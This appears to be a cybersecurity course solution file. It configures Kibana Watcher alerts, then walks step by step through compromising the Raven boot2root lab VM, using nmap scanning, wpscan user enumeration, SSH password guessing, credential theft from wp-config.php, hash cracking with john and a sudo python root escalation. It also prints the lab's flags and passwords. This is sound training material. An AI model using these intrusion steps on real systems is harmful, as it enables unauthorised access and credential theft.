## Activity Solution File: Alert and Attacking Target 1

### Instructions

#### Configuring Alerts

Complete the following to configure alerts in Kibana:
1.  Access Kibana at `192.168.1.100:5601`

2. Click on **Management** > **License Management** and enable the Kibana Premium Free Trial.

3. Click **Management** > **Watcher** > **Create Alert** > **Create Threshold Alert**

4. Implement three of the alerts you designed at the end of Project 2.

You are free to configure any alerts you'd like, but we recommend starting with the following:

- **Excessive HTTP Errors**

  ```kql
  WHEN count() GROUPED OVER top 5 'http.response.status_code' IS ABOVE 400 FOR THE LAST 5 minutes
  ```
  ![](Images/watch1.png)
  
- **HTTP Request Size Monitor**

  ```kql
  WHEN sum() of http.request.bytes OVER all documents IS ABOVE 3500 FOR THE LAST 1 minute
  ```

  ![](Images/Watch2.png)
  
- **CPU Usage Monitor**

  ```kql
  WHEN max() OF system.process.cpu.total.pct OVER all documents IS ABOVE 0.5 FOR THE LAST 5 minutes
  ```

Your alerts should look similar to the following:

 ![](Images/Finished-alerts.png)


**Note**: There are a few ways we can view these log messages and their associated data.

* First, you can see when alerts are firing directly from the Watcher screen.

* As you attack Target 1, keep the watcher page open to view your alerts fire in real time.

- To view network traffic associated with these messages, we need to create a new 'Index Pattern':

- Click on **Management > Index Patterns** and click on the button for `Create Index Pattern`.

  ![](Images/CreateIndex.png)

- Make sure to turn on the toggle button labeled 'Include System Indices' on the top right corner.
  
  ![](images/includeIndices.png)

- Create the pattern `.watcher-history-*`
  ![](Images/defineWatcherPattern.png)

- After you have this new index pattern, you can search through it using the 'Discovery' page.

- Enter `result.condition.met` in as search filter and you can see all the traffic from your alerts.

#### Attacking Target 1

Now that you've configured alerts, you'll attack a vulnerable VM on the network: Target 1. 

Complete the following high-level steps:

1. Scan the network to identify the IP addresses of Target 1.

    ```bash
    # Ping Sweep w/ NMap
    $ nmap -sP 192.168.1.1-255
    Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-16 15:59 EDT
    Nmap scan report for 192.168.1.1 (192.168.1.1)
    Host is up (0.26s latency).
    MAC Address: 18:90:68:97:97:57 (Unknown)
    Nmap scan report for 192.168.1.90 (192.168.1.90)
    Host is up (0.020s latency).
    MAC Address: 88:E9:FE:65:17:B0 (Unknown)
    Nmap scan report for 192.168.1.100 (192.168.1.100)
    Host is up (0.020s latency).
    MAC Address: 88:E9:FE:65:16:F0 (Unknown)
    Nmap scan report for 192.168.1.115 (192.168.1.115)
    Host is up (0.020s latency).
    MAC Address: 88:E9:FE:65:16:C0 (Unknown)
    ```

   Note that hosts `192.168.1.110` and `192.168.1.115` are up, in particular. This solution focuses on the former.

2. Document all exposed ports and services.

    ```bash
    $ nmap -sV 192.168.1.110
    Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-16 16:38 PDT
    Nmap scan report for 192.168.1.110
    Host is up (0.00082s latency).
    Not shown: 995 closed ports
    PORT    STATE SERVICE     VERSION
    22/tcp  open  ssh         OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
    80/tcp  open  http        Apache httpd 2.4.10 ((Debian))
    111/tcp open  rpcbind     2-4 (RPC #100000)
    139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
    445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
    MAC Address: 00:15:5D:00:04:10 (Microsoft)
    Service Info: Host: TARGET1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 11.78 seconds
    ```

   Note, in particular, that port `80` is open.

3. Enumerate the WordPress site. One flag is discoverable after this step.
    - **Hint**: Look for the `Users` section in the output.

    ```bash
    # Use wpscan to enumerate users and vulnerable plugins
    $ wpscan â€“-url http://192.168.1.110/wordpress -eu
    # Generates a lot of output. The important part is as follows:
    [+] User(s) identified:
    [+] steven
      | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
      | Confirmed By: Login Error Messages (Aggressive Detection)

    [+] michael
      | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
      | Confirmed By: Login Error Messages (Aggressive Detection)
    ```

   These two usernames can be used to gain a user shell.

4. Use SSH to gain a user shell. Two flags can be discovered at this step.

    - **Hint**: Guess `michael`'s password. What's the most obvious possible guess?

    ```bash
    # Log in as michael
    $ ssh michael@192.168.1.110
    Enter password: michael
    # Move to the website root directory to find flag2
    michael@target1:~$ cd /var/www
    michael@target1:/var/www$ ls
    flag2.txt
    michael@target1:/var/www$ cat flag2.txt
    flag2{fc3fd58dcdad9ab23faca6e9a36e581c}
    # Search for the word `flag` in all html files to find flag1
    michael@target1:/var/www$ grep -RE flag html
    # Prints very long output -- but, the very last line contains flag1!
    ./vendor/examples/scripts/XRegExp.js:	RegExp.prototype.validate = function (s) {var r = RegExp("^(?:" + this.source + ")$(?!\\s)", getNativeFlags(this)); if (this.global) this.lastIndex = 0; return s.search(r) === 0;};
    ./vendor/composer.lock:	"stability-flags": [],
    ./service.html:             	<!-- flag1{b9bbcb33e11b80be759c4e844862482d} -->

    # Alternatively, search for the flag directly
    michael@target1:/var/www$ grep -REioh flag[[:digit:]]{.+} html
    flag1{b9bbcb33e11b80be759c4e844862482d}
    ```

5. Find the MySQL database password.

     - **Hint**: Look for a `wp-config.php` file in `/var/www/html`.

    ```bash
    # Search for database configuration files
    michael@target1:~$ cat /var/www/html/wordpress/wp-config.php
    # Extra code omitted...
    /** The name of the database for WordPress */
    define('DB_NAME', 'wordpress')

    /** MySQL database username */
    define('DB_USER', 'root')

    /** MySQL database password */
    define('DB_PASSWORD', 'R@v3nSecurity')
    # Extra code omitted...
    ```

6. Use the credentials to log into MySQL and dump WordPress user password hashes.

   ```bash
   # Log into MySQL
   michael@target1:~$ mysql -u root -p
   Enter password: R@v3nSecurity
   Welcome to the MySQL monitor. Commands end with ; or \g.
   Your MySQL connection id is 90
   Server version: 5.5.60-0+deb8u1 (Debian)

   mysql> show databases;

   +---------------------------+
   12 rows in set (0.00 sec)

    mysql> select * from users;
     ```

   ![](Images/mysqldump.png)
    
    ```sql
    -- Find flag3.txt in the blog
    mysql> select * from wp_posts;
    -- Prints a lot of text; scroll through it to find flag3: flag3{afc01ab56b50591e7dccf93122770cd2}
    | flag4    	|          	| inherit 	| closed     	| closed  	|           	| 4-revision-v1 |     	|    	| 2018-08-12 23:31:59 | 2018-08-12 23:31:59 |                   	|       	4 | http://raven.local/wordpress/index.php/2018/08/12/4-revision-v1/ |      	0 | revision  |            	|         	0 |
    |  7 |       	2 | 2018-08-13 01:48:31 | 2018-08-13 01:48:31 | flag3{afc01ab56b50591e7dccf93122770cd2}                                                                         	
    ```


7. Crack password hashes with `john`.

   -  Create a wp_hashes.txt with Steven and Michael's hashes, formatted as follows
    
      ```
      michael:$P$$8jRvZQ.VQcGZ1DeiKToCQd.cPw5XCe0
      steven:$P$8kJVD9jsxx/loJoqNsURgHiaB23j7W/
      ```
   - Use `john` to crack the hashes.

      ```bash
      # Michael's password won't crack
      $ john wp_hashes.txt
      $ john -show wp_hashes.txt
      steven:pink84
      ```

8. Secure a user shell as the user whose password you cracked.

    ```bash
    $ ssh steven@192.168.1.110
    Enter password: pink84
    ```

9. Escalate to `root`.
   
   - One flag can be discovered after this step.:w

    ```bash
    $ sudo python -c 'import pty;pty.spawn("/bin/bash");'
    root@TARGET1:/ > id
    uid=0(root) gid=0(root) groups=0(root)
    root@TARGET1:/ > cd /root
    root@TARGET1:/root > ls
    flag4.txt
    root@TARGET1:/root > cat flag4.txt
    ______                 	 
    | ___ \                	 
    | |_/ /__ ___   _____ _ __  
    |	/  /  _` \ \ / / _ \ '_ \
    | |\ \ (_| |\ V /  __/ | | |
    \_| \_\__,_| \_/ \___|_| |_|

                            
    flag4{715dea6c055b9fe3337544932f2941ce}

    CONGRATULATIONS on successfully rooting Raven!

    This is my first Boot2Root VM - I hope you enjoyed it.
